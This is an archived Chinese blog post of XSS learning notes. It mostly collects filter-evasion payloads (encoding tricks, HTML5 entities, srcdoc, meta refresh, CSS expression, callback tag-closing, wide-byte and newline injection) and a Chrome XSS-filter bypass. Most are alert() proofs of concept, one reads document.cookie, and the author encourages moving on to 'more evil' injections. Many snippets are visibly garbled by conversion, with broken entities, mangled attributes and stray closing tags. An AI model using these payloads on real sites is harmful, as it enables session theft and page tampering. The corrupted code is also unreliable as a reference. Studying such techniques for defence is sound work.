---
title: XSS零碎指南
categories:
  - JavaScript
  - 前端杂烩
tags:
  - tech
  - cnblogs
  - XSS
  - hack
date: 2014-05-01 12:59:00
---

<div class="history-article">本文为归档内容,原始地址在 <a href="http://www.cnblogs.com/hustskyking/archive/2014/05/01/xss-snippets.html" target="_blank">博客园</a>.</div>

<p>该文章是本人两天的学习笔记，共享出来，跟大家交流。知识比较零散，但是对有一定 JS 基础的人来说，每个小知识都有助于开阔你的 Hack 视角。首先声明，本文只是 XSS 攻击的冰山一角，读者自行深入研究。</p>
<h3>一、XSS学习提要</h3>
<ol>
<li><a href="http://qdemo.sinaapp.com/ppt/xss/" target="_blank">http://qdemo.sinaapp.com/ppt/xss/</a> 三水清 简单介绍 xss</li>
<li><a href="http://drops.wooyun.org/tips/689" target="_blank">http://drops.wooyun.org/tips/689</a> 乌云 xss与字符编码</li>
<li><a href="http://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90" target="_blank">http://www.wooyun.org/whitehats/心伤的瘦子</a> 系列教程</li>
<li><a href="http://ha.ckers.org/xss.html" target="_blank">http://ha.ckers.org/xss.html</a> 反射性XSS详细分析和解释</li>
<li><a href="http://html5sec.org/" target="_blank">http://html5sec.org/</a> 各种技巧 ★★★★★</li>
<li><a href="http://www.80sec.com/" target="_blank">http://www.80sec.com/</a> 一些不错的文章</li>

</ol>
<h3>二、XSS攻击要点</h3>
<p><strong>注意：</strong>这些插入和修改都是为了避开浏览器自身的过滤，或者开发者认为的过滤。</p>
<p><strong>1. JS函数。</strong></p>
<p>document.write innerHTML eval setTimeout/setInterval等等都是很多XSS攻击注入的入口</p>
<p><strong>2. html实体编码</strong></p>

```
> "alert("Barret李靖")".replace(/./g, function(s){
     return "<#" + s.charCodeAt(0)
      /*.toString(16) 转换成16进制也可以滴*/
      + ";"
  });

> "<#97;<#108;<#101;<#114;<#116;<#40;<#49;<#41;"

<img src="x" onerror="<#97;<#108;<#101;<#114;<#116;<#40;<#49;<#41;">

```

<p><strong>3. 如果过滤 html 实体编码，可以改成URL编码</strong></p>

```
> encodeURIComponent("<#")
> "%26%23"

```

<p><strong>4. 利用 HTML5 新增字符</strong></p>

```
<colon; 冒号
<NewLine; 换行

<a href="javascr<NewLine;ipt<colon;alert(" barret李靖")"="">XSS</a>

```

<p><strong>5. JS进制转换</strong></p>

```
> "\74\163\143\162\151\160\164\76\141\154\145\162\164\50\61\51\74\57\163\143\162\151\160\164\76"
> "<script>alert("Barret李靖")</script>"

```

<p><strong>6. Base64转换</strong></p>

```
> base64("<script>alert("Barret李靖")</script>");
> PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

<a href="data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">XSS</a>

```

<p><strong>7. 浏览器解析非严格性</strong></p>

```
<img src="image.jpg" title="Hello World" class="test">
  ↓ ↓    ↓        ↓      ↓            ↓
  ①②   ③        ④     ⑤           ⑥

```

<p>①中可插入 NUL字符（0x00）</p>
<p>②和④中空格可以使用 tab（0x0B）与换页键（0x0C），</p>
<p>②还可以使用 / 替换</p>
<p>⑤中的"在IE中也可替换成`。</p>

```
   位置      |        代码               | 可能插入或替代的代码
------------|---------------------------|-----------------------
<的右边 |="" <[here]a="" href="...        | 控制符，空白符，非打印字符
a标签的后门  | <a[here]href=" ...="" 同上="" href属性中间="" <a="" hr[here]ef="...        | 同上+空字节
=两边       | <a href[here]=[here]" 所有字符="" 替换="|" href[here]"...="" union编码符号="" 替换"="">    | 其他引号
>之前       | <a href="..." [here]="">        | 任意字符
/之前       | <a href="...">...<[here] a=""> | 空白符，控制符
/之后       | <a href="...">... | 空白符，控制符
>闭合之前    | <a href="...">...  | 所有字符

```
</a></a></[here]></a></a></的右边>
<p><strong>8. 斜杠</strong></p>
<p>在字符串中斜杠（/）可以用于转义字符，比如转义 " 和 ' ，双斜杠（//）可以用来注释。这样可以很轻松的改变之前的语句，注入内容。</p>
<p><strong>9. 空格的处理方式</strong></p>
<p>在解析的时候空格被转移成 <code><nbsp;</code>,注入的时候可以使用 <code>/**/</code>来替换。</p>
<p><strong>10. 特殊属性</strong></p>
<p>1）srcdoc属性（chrome有效）</p>

```
<iframe srcdoc="<lt;script<gt;alert(" barret李靖")<lt;="" script<gt;"=""></iframe>

```

<p>2）autofoucus</p>

```
<input onfocus="write(1)" autofocus>

```

<p>3）object</p>

```
<object classid="clsid:333c7bc4-460f-11d0-bc04-0080c7055a83">
    <param name="dataurl" value="javascript:alert(" barret李靖")"="">
</object>

```

<p><strong>11.绕过浏览器过滤（crhome）</strong></p>

```
?t="><img src="1" onerror="alert("Barret李靖")">
<input type="hidden" id="sClientUin" value="">

```

<p>浏览器会过滤onerror中的代码，所以换种方式注入</p>

```
?t="><script src="data:text/html,<script>alert(" barret李靖")<="" script=""><!--

```
</script>
<p>chrome拦截，是有一定的拦截规则的，只有它觉得是恶意代码的才会去拦截。</p>
<p><strong>12.替换URL</strong></p>

```
<xss>
<style>.xss{background-image:url("javascript:alert('xss')");}</style><a class="xss"></a>
<style type="text/css">body{background:url("javascript:alert('xss')")}</style>

```
</xss>
<p><strong>13.抓包、换包</strong></p>


<h3>三、XSS攻击方式</h3>
<p><strong>1. javascript:和vbscript:协议执行后的结果将会映射在DOM</strong>后面。</p>

```
<a href="javascript:'\x3cimg src\x3dx onerror=alert(" barret李靖")="">'">click me</a>

```

<p><strong>2. 变量覆盖</strong></p>

```
<form id="location" href="bar">
<script>alert(location.href)</script>

```
</form>
<p><strong>3. meta标签</strong></p>

```
<meta http-equiv="refresh" content="0; url=javascript:alert(document.domain)">
Javascript: 协议可能被禁止，可以使用 data:
<meta http-equiv="refresh" content="0; url=data:text/html,<script>alert(" barret李靖")<="" script="">">

```

<p><strong>4. css注入</strong></p>

```
<style>
@import "data:,*%7bx:expression(write(1))%7D";
</style>
<style>
@imp\ ort"data:,*%7b- = \a %65x\pr\65 ssion(write(2))%7d"; </style>
<style>
<link rel="Stylesheet" href="data:,*%7bx:expression(write(3))%7d">

```
</style>
<p><strong>5. 提前闭合标签</strong></p>

```
http://example.com/test.php?callback=cb

缺陷代码：
<script type="text/javascript">
    document.domain='soso.com';
    _ret={"_res":2};
    try{
        parent.aaa(_ret);
    }catch(err){
        aaa(_ret);
    }
</script>

注入：http://example.com/test.php?callback=cb<script>alert("XSS")</script>

```

<p><strong>原理：</strong>cb为回调函数，如果后端并没有对callback字段进行过滤，则可以<code>cb&lt;/script&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;</code>这么长的一串作为函数名，然后你就懂啦~ 本方式只针对上面有缺陷的代码。</p>
<p><strong>6. 提前闭合双引号</strong></p>

```
<input type="text" value="XSS<quot; onclick=<quot;alert(" barret李靖")"="">

<!--<img src="--><img src="x" onerror="alert("Barret李靖")//"">
<comment><img src="</comment><img src=x onerror=alert(" barret李靖")="" "="">
<![><img src="]><img src=x onerror=alert(" barret李靖")="" "="">
<style><img src="</style><img src="x" onerror="alert("Barret李靖")//"">

```
</comment>
<p><strong>7. 阻止编码</strong></p>

```
?t=;alert("Barret李靖")
<script type="text/javascript">
    var t = query(t); // t = "<quot;;alert("Barret李靖")"
</script>

```

<p>上面可以看到 ";" 被编码了，观察页面编码：</p>

```
<meta http-equiv="Content-Type" content="text/html; charset=gb18030">

```

<p>gbxxx系列编码，可以尝试宽字节：</p>

```
?t=%c0%22alert("Barret李靖")

```

<p><strong>8. 攻击单行注释</strong></p>
<p>URL对应的param中添加换行符（%0a）或者其他换行符。</p>

```
?t=%0aalert("Barret李靖")//

// init('id', "%0aalert("Barret李靖")//");

被解析成

// init('id', "
alert("Barret李靖")//");

```

<p><strong>9. url</strong></p>
<p>url中可以使用很多协议 http:// // javascript: vbscript: data:等等，利用这些属性，可以找到很多的空隙。</p>

```
<a href="data:text/html,<script>alert(" barret李靖")<="" script="">">XSS</a>

```

<p><strong>10. Flash跨域注入</strong></p>
<p>这个我不太熟悉，现在网页上Flash用的越来越少了，懒得继续看了。</p>
<p><strong>11. 利用事件</strong></p>

```
<iframe src="#" onmouseover="alert(document.cookie)"></iframe>

```

<p><strong>12. 利用标签</strong></p>

```
<table><td background="javascript:alert('xss')">

```
</td></table>


<h3>四、XSS攻击实质</h3>
<p>XSS攻击没太多神奇的地方，就是利用浏览器防御不周到或者开发者代码不健壮，悄悄对页面或者服务器进行攻击。</p>
<p><strong>1. 绕过过滤</strong></p>
<p>URL中的 <code>&lt;</code>，在DOM XSS中，可以使用 \u003c (unicode编码)表示，不过他有可能被过滤了，最后解析成<code><lt;</code>，也可以使用 \x3c (Javascript 16进制编码)，<code>&gt;</code> 对应使用 \x3e。这种情况经常在 innerHTML 以及 document.write 中用到。</p>
<p>所谓的过滤包括人工过滤，也包括了浏览器HTML与JavaScript本身的过滤，程序员会在浏览器本身过滤过程中进行一些干扰和修改，这几个流程都给我们提供了很多 xss 攻击的入口。</p>
<p>1) 数据需要过滤，但是未过滤。导致XSS。比如：昵称、个人资料。</p>
<p>2) 业务需求使得数据只能部分过滤，但过滤规则不完善，被绕过后导致XSS。比如：日志、邮件及其它富文本应用。</p>
<p><strong>2. 利用源码中js的解析</strong></p>
<p>比如第二部分提出的第11点，浏览器的拦截</p>

```
?t="><script>alert("Barret李靖")</script>

```

<p>这样的插入会被拦截，当你发现源码中有这么一句话的时候：</p>

```
function parseURL(){
    //...
    t.replace("WOW", "");
    //..
}

```

<p>便可以修改如上参数：</p>

```
?t="><scrwowipt>alert("Barret李靖")</scrwowipt>

```

<p>直接绕过了chrome浏览器对危险代码的防御。</p>
<h3>五、学会XSS攻击</h3>
<p><strong>1. 寻找可控参数</strong></p>
<p>攻击入口在哪里？一般是有输入的地方，比如URL、表单、交互等。</p>
<ul>
<li>含参数的URL中找到参数 value 值的输出点，他可能在html中输入，也可能是在javascript中</li>
<li>实验各种字符（&lt; , &gt; " '等），判断是否被过滤，测试方式，手动输入测试</li>
<li>确定可控范围，是否可以使用unicode编码绕过，是否可以使用HTML编码绕过，是否可以使用Javascript进制编码绕过等等</li>
</ul>
<p><strong>2. 开始注入</strong></p>
<p>注入细节上面都是，基本的思维模式：</p>
<ul>
<li>覆盖</li>
<li>阻断</li>
<li>利用特性</li>
</ul>
<p><strong>3. 修补注入错误</strong></p>
<p>注入后保证没有语法错误，否则代码不会执行，注入了也没用。这里的意思是，你注入的一个参数可能在脚本多处出现，你可以保证一处没语法错误，但是不能保证处处都正确</p>
<p><strong>4. 开搞</strong></p>
<p>测试的时候alert("Barret李靖"),弹出成功再继续其他更邪恶的注入方式。</p>
<h3>六、XSS分类</h3>
<p>为什么留到后面说。XSS也了解了很多次了，每次都是先从概念触发，感觉没啥意思，什么反射性、DOM型、储存型等等，还不如先去实践下，凭着自己对XSS的理解，多看几个网站的源码，找找乐趣。</p>
<p>存储型和反射型相比，只是多了输入存储、输出取出的过程。简单点说：</p>
<p>反射型是：输入--输出；
存储型是：输入--进入数据库*--取出数据库--输出。</p>
<p>这样一来，大家应该注意到以下差别：</p>
<p>反射型是：绝大部分情况下，输入在哪里，输出就在哪里。
存储型是：输入在A处进入数据库， 而输出则可能出现在其它任何用到数据的地方。</p>
<p>反射型是：输入大部分位于地址栏或来自DOM的某些属性，也会偶尔有数据在请求中（POST类型）
存储型是：输入大部分来自POST/GET请求，常见于一些保存操作中。</p>
<p>因而我们找存储型的时候，从一个地方输入数据，需要检测很多输出的点，从而可能会在很多点发现存储型XSS。</p>
<h3>七、辅助工具</h3>
<ol>
<li>http://ha.ckers.org/xsscalc.html</li>
<li>chrome插件 （xss Encode，百度之）</li>
<li>抓包工具，<a href="http://www.telerik.com/download/fiddler" target="_blank">fiddler4</a>  <a href="http://www.charlesproxy.com/latest-release/download.do" target="_blank">chales</a></li>
<li>白名单过滤工具<a href="//github.com/leizongmin/js-xss" target="_blank">github/js-xss</a></li>

</ol>
<h3>八、小结</h3>
<p>简单小结：</p>
<ul>
<li>< 号不应该出现在HTML的大部分节点中。</li>
<li>括号&lt;&gt;是不应该出现在标签内的，除非为引号引用。</li>
<li>在ext节点里面，&lt;左尖括号有很大的危害。</li>
<li>引号在标签内可能有危害，具体危害取决于存在的位置，但是在text节点是没有危害的。</li>
<li>。。。</li>

</ul>
<p>关注漏洞报告平台 Wooyun，多动脑筋，手动 hack。最重要的还是先黑客再红客。</p>
<h3>九、参考资料</h3>
<ul>
<li><a href="http://drops.wooyun.org/tips/689" target="_blank">http://drops.wooyun.org/tips/689</a></li>
<li><a href="http://drops.wooyun.org/tips/147" target="_blank">http://drops.wooyun.org/tips/147</a></li>
<li><a href="http://www.web-tinker.com/article/20468.html" target="_blank">http://www.web-tinker.com/article/20468.html</a></li>
<li><a href="http://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90" target="_blank">http://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90</a></li>
<li><a href="//www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank">//www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></li>

</ul>